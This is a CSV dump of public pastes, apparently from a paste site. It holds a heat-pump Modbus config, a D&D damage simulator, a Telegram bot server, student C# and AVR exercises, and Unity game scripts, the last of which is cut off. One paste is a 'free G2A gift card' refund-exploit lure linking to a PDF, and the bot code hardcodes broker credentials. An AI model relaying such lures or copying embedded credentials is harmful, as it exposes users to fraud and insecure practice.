id,title,username,language,date,content
JmX7Sx5P,data845,TestGuy1,JSON,Monday 19th of February 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a3a4429b7c28a05f323b4a5ee91c044e020b448ee0357c31759c611fa54e33fa77d2f4ea6d9859fa935ccd9d31da7512b0c552c22c40bf285e2ef2f89b9918f1e873b069804a93f815a5b03843ea6b5277f54b5fa1a585efd83b813e855e4497f73c1a547be899adbcc83a5e11ebfc616c21e0c499004b35d518be243836cfe0',
  otherdata: [
    '4baf052fd15f879fc2b0bbc121fe07e8',
    'd47efdda3dff6cb0df2fa89d012e9f7d',
    'd83adab31d19edc86e155a415229eb56',
    '74ae4ea19c344658a837baf8e41f1750',
    'b7935dde18c2400b0dd1e973cba72294',
    '1999414fab0f60d5fe5ab310f25322ab',
    '25fb352fa905aceac0469d33561a7d01',
    '9cd888ed08e9530fe2599b69942916db'
  ]
}"
JPP5zW0K,Acond PRO-R MDB Config,Ondrej_Krejcik,YAML,Monday 19th of February 2024 05:49:09 AM CDT,"modbus:
  - name: Acond PRO R
    type: tcp
    host: 192.168.x.xxx
    port: 502
    delay: 1
    timeout: 1
    message_wait_milliseconds: 1
        
    climates:
     - name: ACOND_T_set_indoor1  # Indoor temperature, sensor 
       slave: 1
       address: 1
       target_temp_register: 0
       input_type: input
       data_type: int16
       scan_interval: 10
       scale: 0.1
       precision: 1
       max_temp: 28
       min_temp: 5
       temp_step: 0.1
       unique_id: mdb_3001
       
     - name: ACOND_T_set_TUV  # Domestic hot water temperature
       slave: 1
       address: 5
       target_temp_register: 4
       input_type: input
       data_type: int16
       scan_interval: 60
       scale: 0.1
       precision: 1
       max_temp: 55
       min_temp: 10
       temp_step: 0.1
       unique_id: mdb_3005
       
     - name: ACOND_T_set_water_back  # Setting return water temperature in heating circuit (except Acond Therm)
       slave: 1
       address: 8
       target_temp_register: 7
       input_type: input
       data_type: int16
       scan_interval: 10
       scale: 0.1
       precision: 1
       max_temp: 40
       min_temp: 10
       temp_step: 0.1
       unique_id: mdb_3008
       
    sensors:
     - name: ACOND_T_act_indoor1  # Current indoor temperature at sensor #1
       slave: 1
       address: 1
       data_type: int16
       scale: 0.1
       precision: 1
       input_type: input
       device_class: temperature
       unit_of_measurement: ""°C""
       unique_id: mdb_4001
       
     - name: ACOND_T_act_TUV  # Current domestic hot water temperature
       slave: 1
       address: 5
       data_type: int16
       scale: 0.1
       precision: 1
       input_type: input
       device_class: temperature
       unit_of_measurement: ""°C""
       unique_id: mdb_4005
       
     - name: ACOND T_act_water_outlet  # Current outlet water temperature from HP
       slave: 1
       address: 18
       data_type: int16
       scale: 0.1
       precision: 1
       input_type: holding
       device_class: temperature
       unit_of_measurement: ""°C""
       unique_id: mdb_4014
       
     - name: ACOND_T_act_water_back  # Current return water temperature in heating circuit
       slave: 1
       address: 8
       data_type: int16
       scale: 0.1
       precision: 1
       input_type: input
       device_class: temperature
       unit_of_measurement: ""°C""
       unique_id: mdb_4008
       
     - name: ACOND_T_act_air  # Current outside air temperature
       slave: 1
       address: 9
       data_type: int16
       scale: 0.1
       precision: 1
       input_type: input
       device_class: temperature
       unit_of_measurement: ""°C""
       unique_id: mdb_4009
       
     - name: ACOND_err_number  # General error number, should always be 0 in normal operation
       slave: 1
       address: 20
       data_type: int16
       input_type: input
       unique_id: mdb_4020
       
     - name: ACOND_err_number_SECMono  # SECMono error number, should always be 0 in normal operation
       slave: 1
       address: 21
       data_type: int16
       input_type: input
       unique_id: mdb_4021
       
     - name: ACOND_err_number_driver  # Driver error number, should always be 0 in normal operation
       slave: 1
       address: 22
       data_type: int16
       input_type: input
       unique_id: mdb_4022
       
     - name: ACOND_capacity_actual_W  # Current heat production
       slave: 1
       address: 23
       data_type: int16
       input_type: input
       device_class: power
       unit_of_measurement: ""W""
       unique_id: mdb_4023
       
     - name: ACOND_comp_capacity_max_W  # Max. heat production
       slave: 1
       address: 14
       data_type: int16
       input_type: input
       device_class: power
       unit_of_measurement: ""W""
       unique_id: mdb_4014a       

"
itcWDdew,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Monday 19th of February 2024 05:40:57 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_663449.pdf
 
Working as of
19 February 2024"
tadsYdX3,1-105 New,Neowhite,C#,Monday 19th of February 2024 05:39:49 AM CDT,"

///////////////////// RU ///////////////////// ///////////////////// RU ///////////////////// ///////////////////// RU ///////////////////// ///////////////////// RU ///////////////////// ///////////////////// RU /////////////////////
1) распаковать архив в отдельную папку 
2) вставить ключ в key.txt, сохранить
3) Открыть файл-конфиг (Config.ini) в текстовом редакторе -> настроить - Сохранить (см описание конфига в пункте 5).
4) Методы запуска 
  4.1) если нужно прокачать только одного определденного персонажа то: 
       в конфиге AutoCharacter ставим AutoCharacter Enabled=""False"" 
       Запустить бота -> Создать + зайти на нужного персонажа -> запустить скрипт.
  4.2) если надо прокачать 7 персонажей то:
       в конфиге AutoCharacter ставим AutoCharacter Enabled=""True""   
       Запустить бота -> запустить скрипт -> зайти на этап выбора персонажа -> дальше скрипт продолжит сам.
       P.s если на персонаже уже был создан перс и нужно начать прокачку с него то надо зайти на него и запустить скрипт когда чар в игре.
5) Описание конфига:
   5.1) General:
          MaxLevel - До какого уровня качать персонажа
          ClassID_1 - ID1 профессии (без необходимости не менять)
          ClassID_2 - ID2 профессии (без необходимости не менять)  
          ClassID_3 - ID3 профессии (без необходимости не менять)
          ClassID_4 - ID4 профессии (без необходимости не менять)
          DelayBeforeRessurect - сколько милисекунда ждать перед тем как прожимать воскрешение (в случае смерти)
          CustomLearnList - ID Скиллов которые учить. задавать через """","""" P.s Все основные скиллы суммонера уже добавленны внутри основного кода скрипта. https://i.imgur.com/Ugz4q4z.png
          ScriptStopAfterLeonelQuest - Завершать прокачку при достижении 100 уровня на моменте где надо в хейне поговорить с НПС. ""True"" - включить ""False"" - выключить
   5.2)
        SummonControl: 
          Enabled - проверять что суммон призван (на 85+ 2 суммона).  ""True"" - включить ""False"" - выключить
          Level40SummonID - ID суммона для 40-84 Лвл (без необходимости не менять) 
          Level85SummonID - ID суммона для 85-99 Лвл (без необходимости не менять) 
          Level100SummonID - ID суммона для 100+ Лвл (без необходимости не менять)
   5.3)
        AutoCharacter: 
          Enabled - автоматическое создание персонажа. ""True"" - включить ""False"" - выключить.
          AutoDelete - автоматическое удаление персонажа (после завершения прокачки)
          CharacterCreatePrm - параметры создания персонажа (без необходимости не менять)
          CharacterNickNamesFile - названия файла в папке ""Nicknames"" из которого брать никнеймы для персонажей - каждый ник не длиннее 16 символов с новой строки. 
          P.s когда никней был использовани или он занят то он записывается в файл Usednames.ini , если все ники из файла не доступны то генерируется рандомный ник след формата - https://i.imgur.com/aDpH67J.png
   5.4)
        AutoMentor 
          Enabled - Автоматически принимать и кидать самому себе наставника. ""True"" - включить ""False"" - выключить.
          AcceptFromAll - принимать наставника от всех. ""True"" - включить ""False"" - выключить.
          AcceptFromNames - принимать наставника только от заданных ников. Ники указывать через """",""""
          P.s если в Адреналине загружен бот/боты с никами из списка AcceptFromNames то они будут кидать наставничество этому боту.
   5.5) AutoClan 
          Enabled - Автоматически Вступать в клан из заданного списка. ""True"" - включить ""False"" - выключить. 
          CLanNames - список кланов в которые вступаем названия указывать через """",""""
          LeaveClanAtMaxLevel - Автоматически покидать клан по окончанию прокачки. ""True"" - включить ""False"" - выключить. 
   5.6)
        Mail 
        Enabled - Автоматически отправлять всю адену по окончанию прокачки , на заданный ник. ""True"" - включить ""False"" - выключить. 
        ReceaverName - ник кому отправляем 
        Caption - заголовок письма 
        Text - текст письма 
   5.7)
        Dailymission 
          Enabled - Автоматически Собирать клановые миссии. ""True"" - включить ""False"" - выключить. 
   5.8) AutoWH
          Enabled - Автоматически складировать  адену в КВХ по завершению прокачки. ""True"" - включить ""False"" - выключить.  
          TeleoprtID - ID телепота (города где складируем)
          GpsPointName - название точки куда бежать 
          PressButtons - параметр овечающий за открывание диалога, первое значение ID Npc, далее номера кнопок которые нажимать (параметры через ,) - по дефолту настроил АДен
6) proxy.
     если при запуска скрипта он не может проверить время ключа (не появляется надпись об оставшемся времени и сколько окон доступно) , или появляется ошибка в которой говорится про verify..
     в файл key.txt нужно добавить прокси ipv4-6
     в первой строке файла все так же оставляем ключ 
     во 2 строку адрес прокси 
     в 3 строку порт 

///////////////////// RU ///////////////////// ///////////////////// RU ///////////////////// ///////////////////// RU ///////////////////// ///////////////////// RU ///////////////////// ///////////////////// RU /////////////////////

///////////////////// EN ///////////////////// ///////////////////// EN ///////////////////// ///////////////////// EN ///////////////////// ///////////////////// EN ///////////////////// ///////////////////// EN ///////////////////// 
1) unpack archive into a separate folder
2) paste the key into key.txt, save
3) Open the config file (Config.ini) in a text editor -> make settings -> Save (see description of the config in point 5).
4) Launch methods
   4.1) if you need to LevelUp only one specific character then:
        in the AutoCharacter config we set AutoCharacter Enabled=""False""
        Launch the bot -> Create + LoginIn on desired character -> run the script.
   4.2) if you need to LevelUp 7 characters then:
        in the AutoCharacter config set AutoCharacter Enabled=""True""
        Launch the bot -> run the script -> GoTo character selection stage -> then the script will continue on its own.
        P.s if a character has already been created and you need to start leveling up with him, then you need select hi and enter in game -> run the script when the character is in the game.
5) Description of the config:
    5.1) General:
           MaxLevel - To what level script should Leveling character
           ClassID_1 - ID1 of the profession (do not change unless necessary)
           ClassID_2 - ID2 of the profession (do not change unless necessary)
           ClassID_3 - ID3 profession (do not change unless necessary)
           ClassID_4 - ID4 profession (do not change unless necessary)
           DelayBeforeRessurect - how many milliseconds to wait before resurrecting (in case of death)
           CustomLearnList - ID of Skills for auto learning. can be listed via """","""" P.s All the main skills of dark summoner are already added inside the main code https://i.imgur.com/Ugz4q4z.png
           ScriptStopAfterLeonelQuest - Complete leveling when you reach level 100 at the moment where you need to talk to the NPC in Heine. ""True"" - enable ""False"" - disable
    5.2)
         SummonControl:
           Enabled - check that the Summs is summoned (at 85+ 2 summons). ""True"" - enable ""False"" - disable
           Level40SummonID - summon ID for lvl 40-84 (do not change unless necessary)
           Level85SummonID - summon ID for lvl 85-99 (do not change unless necessary)
           Level100SummonID - summon ID for 100+ lvl (do not change unless necessary)
    5.3)
         AutoCharacter:
           Enabled - automatic character creation. ""True"" - enable ""False"" - disable.
           AutoDelete - automatic deletion of a character (when leveling is completed)
           CharacterCreatePrm - character creation parameters (do not change unless necessary)
           CharacterNickNamesFile - the name of the file in the ""Nicknames"" folder from which to take nicknames for characters - each nickname is no longer than 16 characters from a new line.
           P.s when a nickname has been used by script or is busy, it is written to the file Usednames.ini, if all nicknames from the file are not available, then a random nickname trace format is generated - https://i.imgur.com/aDpH67J.png
    5.4)
         AutoMentor
           Enabled - Automatically accept and assign a mentor to yourself. ""True"" - enable ""False"" - disable.
           AcceptFromAll - accept a mentor from everyone. ""True"" - enable ""False"" - disable.
           AcceptFromNames - accept mentor only from specified nicknames. Nicky should be indicated with """",""""
           P.s if a bot/bots with nicknames from the AcceptFromNames list are loaded in Adrenaline, then they will give mentoring to this bot.
    5.5) AutoClan
           Enabled - Automatically Join a clan from a given list. ""True"" - enable ""False"" - disable.
           CLanNames - a list of clans that we join; the names should be indicated using """",""""
           LeaveClanAtMaxLevel - Automatically leave the clan upon completion of leveling. ""True"" - enable ""False"" - disable.
    5.6)
         Mail
         Enabled - Automatically send all adena at the end of leveling to a setted nickname. ""True"" - enable ""False"" - disable.
         ReceaverName - nickname of mail recipient 
         Caption - letter title
         Text - letter text
         p.s send mail allowed only for lvl 106+ , or if Mail receaver added in friends 
    5.7)
         Daily mission
           Enabled - Automatically Collect clan missions. ""True"" - enable ""False"" - disable.
    5.8) AutoWH
           Enabled - Automatically deposit adena in the storage when exping finished. ""True"" - enable ""False"" - disable.
           TeleoprtID - telepot ID (city where we store) 107 = aden 126 = heine (for detect teleport id do teleport with running script)
           GpsPointName - name of the point where to run
           PressButtons - parameter responsible for opening the dialog, the first value is ID Npc, then the numbers of the buttons to press (parameters through ,) - configured by default ADen
6) proxy.
      if, when running the script, it cannot check the key time (no message appears about the remaining time and how many windows are available), or an error appears that says verify...
      you need to add an ipv4-6 proxy to the key.txt file
      we still leave the key in the first line of the file
      in line 2 add proxy address
      in line 3 add proxy port
      
///////////////////// EN ///////////////////// ///////////////////// EN ///////////////////// ///////////////////// EN ///////////////////// ///////////////////// EN ///////////////////// ///////////////////// EN ///////////////////// "
ugFqZVJS,"calculation for dnd - damage per round at 6 lvl (barbarian_berserker/two_faces, fighter_champion)",xaixati,Python,Monday 19th of February 2024 05:22:40 AM CDT,"import random


total_damage=0
for i in range(1,101):
    for j in range (3):
        krit = 1;
        number = random.randint(1, 20)
        if (number==20):
            krit=3
        number+=4
        number+=3
        if (number>=17):
            for k in range(krit):
                total_damage+=random.randint(1,8)
            total_damage+=4+4+2
print (""half_orc two_faces bare_hands (and upgrade) without advantage"")
print(total_damage)
print(total_damage/100)
print()

total_damage=0
for i in range(1,101):
    for j in range (3):
        krit = 1;
        number = random.randint(1, 20)
        if (number==20):
            krit=4
        number+=4
        number+=3
        if (number>=17):
            for k in range(krit):
                total_damage+=random.randint(1,12)
            total_damage+=4+2

print (""piercer-berserk_halforc with 1d12 without advantage"")
print(total_damage)
print(total_damage/100)
print()

for i in range(1,101):
    flag_of_krit=0
    for j in range (2):
        krit=1
        number = random.randint(1, 20)
        if (number==20 or number==19):
            krit=4
            flag_of_krit = 1
        number+=4
        number+=3
        if (number>=17):
            for k in range(krit):
                damage=random.randint(1,12)
                if (damage==1 or damage==2):
                    damage=random.randint(1, 12)
                total_damage+=damage
            total_damage+=4
    if (flag_of_krit==1):
        krit = 1
        number = random.randint(1, 20)
        if (number == 20 or number == 19):
            krit = 4
        number += 4
        number += 3
        if (number >= 19):
            for k in range(krit):
                damage = random.randint(1, 12)
                if (damage == 1 or damage == 2):
                    damage = random.randint(1, 12)
                total_damage += damage
            total_damage += 4
        flag_of_krit=0
print (""piercer-champion_halforc with 1d12 and great_weapon_fighting+great_weapon_master without advantage"")
print(total_damage)
print(total_damage/100)
print()

total_damage=0
for i in range(1,101):
    for j in range (3):
        krit = 1;
        number_1 = random.randint(1, 20)
        number_2 = random.randint(1, 20)
        number = max (number_1, number_2)
        if (number==20):
            krit=3
        number+=4
        number+=3
        if (number>=17):
            for k in range(krit):
                total_damage+=random.randint(1,8)
            total_damage+=4+4+2
print (""half_orc two_faces bare_hands (and uprgade) with advantage"")
print(total_damage)
print(total_damage/100)
print()

total_damage=0
for i in range(1,101):
    for j in range (3):
        krit = 1;
        number_1 = random.randint(1, 20)
        number_2 = random.randint(1, 20)
        number = max(number_1, number_2)
        if (number==20):
            krit=4
        number+=4
        number+=3
        if (number>=17):
            for k in range(krit):
                total_damage+=random.randint(1,12)
            total_damage+=4+2

print (""piercer-berserk_halforc with 1d12 with advantage"")
print(total_damage)
print(total_damage/100)
print()

for i in range(1,101):
    flag_of_krit=0
    for j in range (2):
        krit = 1;
        number_1 = random.randint(1, 20)
        number_2 = random.randint(1, 20)
        number = max(number_1, number_2)
        if (number==20 or number==19):
            krit=4
            flag_of_krit=1
        number+=4
        number+=3
        if (number>=17):
            for k in range(krit):
                damage = random.randint(1, 12)
                if (damage == 1 or damage == 2):
                    damage = random.randint(1, 12)
                total_damage += damage
            total_damage += 4
    if (flag_of_krit==1):
        krit = 1
        number = random.randint(1, 20)
        if (number == 20 or number == 19):
            krit = 4
        number += 4
        number += 3
        if (number >= 19):
            for k in range(krit):
                damage = random.randint(1, 12)
                if (damage == 1 or damage == 2):
                    damage = random.randint(1, 12)
                total_damage += damage
            total_damage += 4
        flag_of_krit=0
print (""piercer-champion_halforc with 1d12 and great_weapon_fighting+great_weapon_master with advantage"")
print(total_damage)
print(total_damage/100)"
A2pCdEwU,Untitled,AskhatBaltabayev,JSON,Monday 19th of February 2024 05:06:28 AM CDT,"{
  ""name"": ""wedo-web"",
  ""$schema"": ""../../node_modules/nx/schemas/project-schema.json"",
  ""sourceRoot"": ""packages/web/src"",
  ""projectType"": ""application"",
  ""targets"": {},
  ""tags"": []
}
"
k1yhh5VH,Untitled,morington,Python,Monday 19th of February 2024 04:42:47 AM CDT,"from contextlib import asynccontextmanager
from datetime import datetime

import alembic
import structlog
from aiogram import Bot, Dispatcher
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.enums import ParseMode
from aiogram.fsm.storage.redis import RedisStorage, DefaultKeyBuilder
from aiogram.webhook.aiohttp_server import setup_application, SimpleRequestHandler
from aiohttp import web
from aiohttp.web_request import Request
from aiohttp.web_response import Response
from alembic.config import Config
from dynaconf import LazySettings
from faststream import FastStream
from faststream.rabbit import RabbitBroker

from WebApp import handlers
from WebApp.middlewares.database import SessionMiddleware
from WebApp.middlewares.user import UserDetectMiddleware
from config.configuration import Configuration
from database.build import PostgresBuild


logger: structlog.BoundLogger = structlog.getLogger(__name__)
broker = RabbitBroker(""amqp://morington:qwer@localhost:5672/"")


class WebhookConstructor:
    def __init__(self, domain: str):
        self.URL = domain
        self.WEBHOOK_PATH = ""/bot{bot_token}""

    def webhook_url(self, token: str) -> str:
        return f""{self.URL}{self.WEBHOOK_PATH.format(bot_token=token)}""


async def ping(request: Request) -> Response:
    """"""
    Checking the application's functionality `/ping`.

    :param request: Request object
    :return: { status"": ""OK"", ""datetime"": ""22.11.2023 17:46:00"" }
    """"""
    now = datetime.now()
    data = {""status"": ""OK"", ""datetime"": now.strftime(""%d.%m.%Y %H:%M:%S"")}
    logger.debug(""Application ping"", data=data)
    return web.json_response(data)


@broker.subscriber(""routing_key"")
async def handle(msg):
    print(msg, type(msg))


class Initializing:
    def __init__(self, configuration: LazySettings):
        self.configuration = configuration

        self.postgres = PostgresBuild(url=self.configuration.postgres_url)

        self.webhook = WebhookConstructor(domain=self.configuration.web.domain)

        redis_storage = RedisStorage.from_url(
            url=self.configuration.redis_url,
            key_builder=DefaultKeyBuilder(with_destiny=True, with_bot_id=True),
        )

        self.session = AiohttpSession()
        self.app = web.Application()

        self.bot_settings = {
            ""session"": self.session,
            ""parse_mode"": ParseMode.HTML,
            ""disable_web_page_preview"": True,
        }
        bot = Bot(token=self.configuration.telegrambot.key, **self.bot_settings)

        main_dp = Dispatcher(storage=redis_storage)
        main_dp.startup.register(self.on_startup)

        SimpleRequestHandler(dispatcher=main_dp, bot=bot).register(self.app, path=self.webhook.WEBHOOK_PATH)

        setup_application(self.app, main_dp, bot=bot)

        self.app.router.add_get(""/ping"", ping)
        self.app.on_cleanup.append(self.shutdown_server)

    async def on_startup(self, dispatcher: Dispatcher, bot: Bot):
        _url: str = self.webhook.webhook_url(token=self.configuration.telegrambot.key)

        await bot.delete_webhook(drop_pending_updates=True)
        await bot.set_webhook(_url)
        logger.debug(f""Installed WebHook at: {_url[:-10] + '*' * 10}"")

        await self.dispatcher_installer(dispatcher)

        dispatcher.include_router(handlers.router)

        await broker.start()

    async def dispatcher_installer(self, dispatcher: Dispatcher):
        dispatcher.update.middleware(SessionMiddleware(session=self.postgres.session()))
        dispatcher.update.middleware(UserDetectMiddleware())

    async def shutdown_server(self, app):
        await self.postgres.completion()
        logger.debug(""Application stopped"")


if __name__ == ""__main__"":
    logger.debug(""Launching the application"")

    # configuration
    cfg = Configuration()
    config = cfg.all_configuration()

    #  Alembic upgrade
    alembic_config = Config(file_=""alembic.ini"", attributes={""configure_logger"": False})
    alembic.command.upgrade(alembic_config, ""head"")
    logger.debug(""Alembic updates the database"")

    #  TelegramBot
    logger.debug(""Telegram bot initialization"")
    telegrambot = Initializing(configuration=config)

    web.run_app(telegrambot.app, host=config.web.host, port=config.web.port)
"
8zV6QRHD,WorkingWithSpecificLines,UrayFenn,C#,Monday 19th of February 2024 04:31:06 AM CDT,"namespace WorkingWithSpecificLines
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[,] numbers = new int[4, 4];
            Random random = new Random();
            int minValue = 1;
            int maxValue = 15;
            int productFirstColumn = 1;
            int lineNumbers = 1;
            int sumSecondLine = 0;
            int columnNumbers = 0;

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    numbers[i, j] = random.Next(minValue, maxValue);
                    Console.Write(numbers[i, j] + "" "");
                }

                Console.WriteLine();
            }

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                productFirstColumn *= numbers[i, columnNumbers];
            }

            for (int i = 0; i < numbers.GetLength(1); i++)
            {
                sumSecondLine += numbers[lineNumbers, i];
            }

            Console.WriteLine($""\nCумма второй строки: {sumSecondLine}.\nПроизведение первого столбца: {productFirstColumn}"");
        }
    }
}"
V5kDbKYW,Blinky,chipant,C,Monday 19th of February 2024 04:20:39 AM CDT,"#include <avr/io.h>
#include <util/delay.h>
int main(void) {
	// Set the data direction register for LED pins
	DDRB |= (1 << DDB5); // Pin 13 (BUILTIN LED) - output
	DDRB |= (1 << DDB4); // Pin 12 - output
	while (1) {
	// Toggle the LED connected to Pin 13 every 1 second
	PORTB ^= (1 << PORTB5); // Toggle BUILTIN LED
	// Delay for 1 second
	_delay_ms(1000);
	// Toggle the LED connected to Pin 12 every 2 seconds
	
	static uint8_t count = 0;
	count++;
	if (count == 2) {
		PORTB ^= (1 << PORTB4); // Toggle Pin 12
		count = 0;
	// Delay for 1 second
	
	}
	_delay_ms(1000);
	
	}
return 0;
}"
02GRZgGv,Player,noobHasan,C#,Monday 19th of February 2024 04:19:41 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using DG.Tweening;
using Dreamteck.Splines;
using Lofelt.NiceVibrations;
public enum BallColor {
    Blue,
    Green,
    Purple,
    Red,
    Yellow,
    Aqua,
    Brown,
    Levendar,
    Orange,
    Pink
}

public class Player : MonoBehaviour
{
    public PathManager _pathManager;
    public float _distanceTravelled;
    private float _speed = 10f;

    public bool isMoving = false;
    public bool canMove;
    public bool reachedDestination;

    public MeshRenderer playerMesh;

    public bool lineConstructed;
    public bool commonPath;
    public bool isGameEnded;


    public BallColor ballColor;
    public GameObject _trail;
    public GameObject _ring;
    public bool moveBack;

    public CollisionDetector collisionDetectorScr;

    SplinePositioner splinePositioner;


    [Header(""Color State"")]
    public Material trailMaterial;
    public Material ringMaterial;
    public Material playerMeshMaterial;

    public Target target;
    void OnEnable()
    {
        splinePositioner = gameObject.AddComponent<SplinePositioner>();
        splinePositioner.spline = _pathManager.spline;
        splinePositioner.mode = SplinePositioner.Mode.Distance;
    }

    private void Start()
    {
        if (_trail == null) _trail = transform.GetChild(1).gameObject;
        if (_ring == null) _ring = transform.GetChild(2).gameObject;

        _ring.transform.localScale = Vector3.zero;
        _ring.SetActive(false);
        _trail.SetActive(false);
    }

    public void SetPlayerColors(Material trailMat, Material ringMat, Material meshMat)
    {
        // Debug statements for checking materials
        Debug.Log($""Setting colors for {ballColor} ball:"");
        Debug.Log($""Trail Material: {trailMat}"");
        Debug.Log($""Ring Material: {ringMat}"");
        Debug.Log($""Mesh Material: {meshMat}"");

        // Set the trail material
        if (_trail != null && trailMat != null)
        {
            _trail.GetComponent<TrailRenderer>().material = trailMat;
        }

        // Set the ring material
        if (_ring != null && ringMat != null)
        {
            _ring.GetComponent<MeshRenderer>().material = ringMat;
        }

        // Set the player mesh material
        if (playerMesh != null && meshMat != null)
        {
            playerMesh.GetComponent<MeshRenderer>().material = meshMat;
        }
    }


    void Update()
    {
        if (canMove)
        {
            if (moveBack)
            {
                MoveBack();
                _distanceTravelled -= _speed * Time.deltaTime;
                splinePositioner.SetDistance(_distanceTravelled);
            }
            if (isGameEnded) return;
            MovePlayerSpline();
        }
    }

    public void SelectPlayerAndMove()
    {
        GameManager.Instance.PlayHaptic(HapticPatterns.PresetType.MediumImpact);
        OnClickAnimation();
        _pathManager.ConstructPathForBall();
        canMove = true;

        EnableTouchTutorial();
    }

    public void EnableTouchTutorial()
    {
        int actualLevelIndex = LevelLoader.Instance.Actual_Level_Index() - 1;

        if (actualLevelIndex == 10 && PlayerPrefs.GetInt(""ObstacleTutorial"") == 0)
        {
            LevelSetup.Instance.HideObstacleTutorial();
        }

        if (PlayerPrefs.GetInt(""TouchTutorial"") == 0)
        {
            if (ballColor == BallColor.Red)
            {
                TutorialManager.Instance.showSecondTouchTutorial = true;
            }
            TutorialManager.Instance.DisableTouchTutorial1();
        }
        else if (ballColor == BallColor.Green && PlayerPrefs.GetInt(""TouchTutorial2"") == 0)
        {
            TutorialManager.Instance.DisableTouchTutorial2();
        }
    }

    public void MovePlayerSpline()
    {
        if(!isGameEnded)
        {
            if(splinePositioner.GetPercent() >= 1)
            {
                OnDestinationReached();
            }
            else
            {
                isMoving = true;
                _distanceTravelled += _speed * Time.deltaTime;
                splinePositioner.SetDistance(_distanceTravelled);
            }
        }
    }

    void OnDestinationReached()
    {
        if(!reachedDestination)
        {
            isMoving = false;
            TargetReachAnimation();
            GameManager.Instance.PlayHaptic(HapticPatterns.PresetType.MediumImpact);
            reachedDestination = true;
        }
        
    }

    public void DestroyBall()
    {
        _speed = 0f;
        isGameEnded = true;
        playerMesh.transform.DOScale(1.5f, .25f).SetEase(Ease.OutFlash).OnComplete(() =>
        {
            playerMesh.transform.DOScale(0, .5f).SetEase(Ease.OutElastic);
        });
        _ring.SetActive(false);
    }

    public IEnumerator onObstacleCollision()
    {
        _speed = 7f;
        float targetSpeed = 0f;
        float duration = 0.1f;
        DOTween.To(() => _speed, x => _speed = x, targetSpeed, duration)
            .SetEase(Ease.Linear);
        moveBack = true;
        GameManager.Instance.PlayHaptic(HapticPatterns.PresetType.Failure);
        yield return new WaitForSeconds(0.1f);
        moveBack = false;
        yield return new WaitForSeconds(0.1f);
        playerMesh.transform.DOScale(0, .25f).SetEase(Ease.InCubic);
        if (!GameManager.Instance.gameEnded)
        {
            GameManager.Instance.EnableGameEndCanvas(false);
        }
    }

    public void MoveBack()
    {
        _distanceTravelled -= _speed * Time.deltaTime;
    }

    public void OnClickAnimation()
    {
        playerMesh.transform.DOScale(1.5f, 0.2f).SetEase(Ease.OutCubic).OnComplete(() =>
        {
            playerMesh.transform.DOScale(1f, 0.15f).SetEase(Ease.OutCubic);
        });
    }

    public void TargetReachAnimation()
    {
        _trail.SetActive(false);
        _ring.gameObject.SetActive(true);
        _ring.transform.DOScale(1.05f, 0.25f).SetEase(Ease.OutBack).OnComplete(()=> {
            _ring.transform.DOScale(1f, 0.2f).SetEase(Ease.OutBack);
        });
        playerMesh.transform.DOScale(1.25f, 0.15f).SetEase(Ease.OutCubic).OnComplete(() =>
        {
            playerMesh.transform.DOScale(1f, 0.1f).SetEase(Ease.OutCubic);
        });
    }

}

"
XdxKVZnh,LevelSetup,noobHasan,C#,Monday 19th of February 2024 04:19:23 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using DG.Tweening;
using UnityEngine.UI;
using TMPro;
using System;
using Random = UnityEngine.Random;

public class LevelSetup : MonoBehaviour
{
    public static LevelSetup Instance;

    public List<GameObject> allBallsArray = new List<GameObject>();

    [Space(10)]
    [Header(""Obstacle Tutorial"")]
    public GameObject obstacleTutorialPanel;
    public SpriteRenderer obstacleTutorialHand;
    public SpriteRenderer textPanelArrow;
    public SpriteRenderer textPanelImage;
    public TMP_Text tapHereText;
    public TMP_Text textPanelText;


    [Header(""Materials"")]
    public Material blueMaterial;
    public Material greenMaterial;
    public Material purpleMaterial;
    public Material redMaterial;

    public Material playerMat;
    public Material ringMat;
    public Material trailMat;
    private void Awake()
    {
        Instance = this;
    }

    private void Start()
    {
        int actualLevelIndex = LevelLoader.Instance.Actual_Level_Index() - 1;

        if (actualLevelIndex == 10 && PlayerPrefs.GetInt(""ObstacleTutorial"") == 0)
        {
            ShowObstacleTutorial();
        }
        else
        {
            if (obstacleTutorialPanel != null)
            {
                obstacleTutorialPanel.SetActive(false);
            }

        }

        SetupColors();
    }


    private void SetupColors()
    {
        List<BallColor> availableBallColors = GetAllBallColors();
        foreach (GameObject ballObject in allBallsArray)
        {
            Player playerScript = ballObject.GetComponentInChildren<Player>();
            if (playerScript != null)
            {
                if (availableBallColors.Count > 0)
                {
                    // Choose a random ball color from the available colors
                    BallColor randomBallColor = availableBallColors[Random.Range(0, availableBallColors.Count)];

                    // Set the ball color
                    playerScript.ballColor = randomBallColor;
                    Debug.Log(randomBallColor);

                    // Set the corresponding target color
                    SetTargetColor(ballObject, randomBallColor);

                    // Set the ring color
                    SetRingColor(playerScript._ring, randomBallColor);

                    // Call the method to set player colors
                    playerScript.SetPlayerColors(trailMat, ringMat, playerMat);

                    // Remove the chosen color from the available colors list
                    availableBallColors.Remove(randomBallColor);
                }
            }
        }
    }

    private List<BallColor> GetAllBallColors()
    {
        List<BallColor> ballColors = new List<BallColor>();

        foreach (GameObject ballObject in allBallsArray)
        {
            Player playerScript = ballObject.GetComponentInChildren<Player>();
            if (playerScript != null)
            {
                ballColors.Add(playerScript.ballColor);
            }
            else
            {
                Debug.LogError(""Player script not found on ball object: "" + ballObject.name);
            }
        }
        return ballColors;
    }


    private void SetTargetColor(GameObject ballObject, BallColor ballColor)
    {
        Target targetScript = ballObject.GetComponentInChildren<Target>();

        if (targetScript != null)
        {
            // Set the target color
            targetScript.targetColor = (TargetColor)Enum.Parse(typeof(TargetColor), ballColor.ToString());

            // Set the target material
            targetScript.targetMaterial = GetMaterialForBallColor(ballColor);
        }
    }
    private void SetRingColor(GameObject ringObject, BallColor ballColor)
    {
        if (ringObject != null)
        {
            // Set the ring material based on the ball color
